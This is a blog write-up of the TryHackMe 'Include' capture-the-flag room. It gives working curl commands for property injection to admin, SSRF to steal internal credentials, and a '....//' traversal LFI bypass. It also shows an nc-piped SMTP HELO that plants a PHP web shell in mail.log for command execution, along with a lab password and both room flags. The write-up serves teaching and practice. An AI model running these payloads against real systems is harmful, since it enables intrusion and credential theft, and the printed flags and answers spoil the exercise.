---
title: "TryHackMe Include: from property injection to log poisoning RCE"
date: 2026-10-19T18:52:00+05:30
lastmod: 2026-10-19T18:52:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-inc/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - SSRF
  - LFI
  - log poisoning
  - property injection
  - web application pentesting
  - advanced server-side attacks
  - Node.js
  - PHP

draft: false
description: "TryHackMe Include walkthrough: property injection to admin, SSRF credential theft, nested traversal LFI bypass, and SMTP log poisoning to RCE."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|Include |![Include room icon](https://cdn-images.tryhackme.com/room-icons/5f9c7574e201fe31dad228fc-1718365394351)|

This medium-difficulty room chains four distinct techniques across two web applications running on the same box: a Node.js Express app on port 4000 and a PHP System Monitoring Portal (SysMon) on port 50000. It sits in the Advanced Server-Side Attacks module alongside the [SSRF walkthrough](/post/thm-room-ssrfhr/), the [File Inclusion walkthrough](/post/thm-room-filepathtraversal/), and the [Prototype Pollution walkthrough](/post/thm-room-prototypepollution/). The attack path moves from object property injection to SSRF to credential theft to LFI bypass to SMTP log poisoning for code execution.

## Task 1: Include

The lab deploys a single machine with eight open services. The interesting ones are:

| Port | Service | Purpose |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.2p1 |
| 25 | SMTP | Postfix (hostname: mail.filepath.lab) |
| 4000 | HTTP | Node.js Express, user profile and friend system |
| 50000 | HTTP | Apache 2.4.41, PHP System Monitoring Portal |

An internal API on port 5000 is bound to localhost only and holds the credentials that connect the two applications.

### Step 1: login and reconnaissance

The Node.js app accepts `guest/guest` at `POST /signin`. After login, the friend profile at `/friend/1` reveals the data model: each user object has properties including `id`, `name`, `age`, `country`, `albums`, `isAdmin`, and `profileImage`. The `isAdmin` field is `false` for the guest account.

### Step 2: property injection to gain admin

The `/recommend-activity/<id>` endpoint accepts JSON with `activityType` and `activityName`. The server assigns the value directly to the user object using the activity type as the key:

```bash
curl -s -b /tmp/inc_node.txt \
  -H 'Content-Type: application/json' \
  -X POST http://TARGET:4000/recommend-activity/1 \
  -d '{"activityType":"isAdmin","activityName":"true"}'
  # {"success":true}
```

This is not prototype pollution (which targets `__proto__`). It is direct property injection: the server sets `user.isAdmin = "true"` because `activityType` controls which property gets written. After this, `/admin/api` and `/admin/settings` become accessible.

### Step 3: SSRF via banner image update

The admin settings page has a form that fetches a URL and sets it as the profile banner. The `POST /update-banner-image` endpoint takes a `url` parameter and makes a server-side HTTP request:

```bash
curl -s -b /tmp/inc_node.txt \
  -X POST http://TARGET:4000/update-banner-image \
  -d 'url=http://127.0.0.1:5000/getAllAdmins101099991'
```

The internal API at `127.0.0.1:5000` has two endpoints. The first, `/internal-api`, returns a secret key. The second, `/getAllAdmins101099991`, returns admin credentials for both web applications.

The banner image on the friend profile now contains a base64 data URI. Decoding it reveals the SysMon administrator credentials:

```
username: administrator
password: S$9$qk6d#**LQU
```

{{< ad >}}

### Step 4: SysMon login and first flag

Logging in to the SysMon portal on port 50000 with those credentials, the dashboard displays the first flag.

**What is the flag value after logging in to the SysMon app?** **THM{!50_55Rf_1S_d_k3Y??!}**

### Step 5: LFI with nested traversal bypass

The SysMon profile page loads images through `profile.php?img=`, which reads from the `uploads/` directory. The application filters traversal by stripping the `../` substring in a single pass:

```
../   -> (stripped)
....// -> after stripping ../ from the middle, the outer characters collapse to ../
```

The path from `uploads/` to the filesystem root is nine directories deep (`/var/www/html/uploads/` has four path components, plus the web root structure). Nine levels of `....//` survive the filter and resolve to nine `../` sequences:

```bash
curl -s -b /tmp/inc_sysmon.txt \
  "http://TARGET:50000/profile.php?img=....//....//....//....//....//....//....//....//....//etc/passwd"
  # root:x:0:0:root:/root:/bin/bash
  # ...
```

The filter strips `../` once from each `....//`, leaving `../` intact. Fewer than nine levels do not escape the `uploads/` base directory.

### Step 6: SMTP mail.log poisoning

The LFI primitive reads files but does not execute code on its own. The escalation path is log poisoning: inject PHP code into a log file, then include that log through the LFI.

Apache's `access.log` was not readable through this path, but the SMTP service on port 25 writes to `/var/log/mail.log`. The `HELO` command accepts arbitrary strings and logs them verbatim:

```bash
{
  sleep 1; echo -e "HELO <?php system(\$_GET['cmd']); ?>\r"
  sleep 1; echo -e "MAIL FROM:<test@test.com>\r"
  sleep 1; echo -e "RCPT TO:<root@mail.filepath.lab>\r"
  sleep 1; echo -e "DATA\r"
  sleep 1; echo -e "test\r.\r"
  sleep 1; echo -e "QUIT\r"
} | nc TARGET 25
```

The PHP payload sits in the HELO field specifically because Postfix logs it as-is. Other fields like `MAIL FROM` and `RCPT TO` strip or mangle special characters inside angle brackets.

### Step 7: LFI to RCE

Including the poisoned mail.log through the LFI vector with a `cmd` parameter executes the injected PHP:

```bash
curl -s -b /tmp/inc_sysmon.txt \
  "http://TARGET:50000/profile.php?img=....//....//....//....//....//....//....//....//....//var/log/mail.log&cmd=find+/var/www/html+-name+*.txt+-type+f"
  # /var/www/html/505eb0fb8a9f32853b4d955e1f9123ea.txt
```

A hidden text file sits in the web root, named with an MD5 hash. Reading it:

```bash
curl -s -b /tmp/inc_sysmon.txt \
  "http://TARGET:50000/profile.php?img=....//....//....//....//....//....//....//....//....//var/www/html/505eb0fb8a9f32853b4d955e1f9123ea.txt"
  # THM{505eb0fb8a9f32853b4d955e1f9123ea}
```

**What is the flag value you found on the system?** **THM{505eb0fb8a9f32853b4d955e1f9123ea}**

## Takeaways

**A single-pass string filter on traversal sequences is no filter at all.** The SysMon application stripped `../` once, so `....//` collapsed to exactly the traversal it tried to prevent. This is a textbook bypass, but the depth matters: nine levels were needed because the base directory was nine components from root. Testing with three or five levels returned empty responses, which looked like the filter was working when it was actually just insufficient depth.

**Property injection and prototype pollution are different vulnerabilities with the same enabling mistake.** The Node.js app let user input control which property was set on the user object, turning `activityType` into a direct key assignment. This did not pollute `__proto__` or affect other objects. It wrote `isAdmin` on one specific user, which was enough to unlock the admin panel and the SSRF endpoint behind it. The fix is the same for both: validate property names against an allowlist before assignment.

Room solved 100%: 1 task, 2 answers.
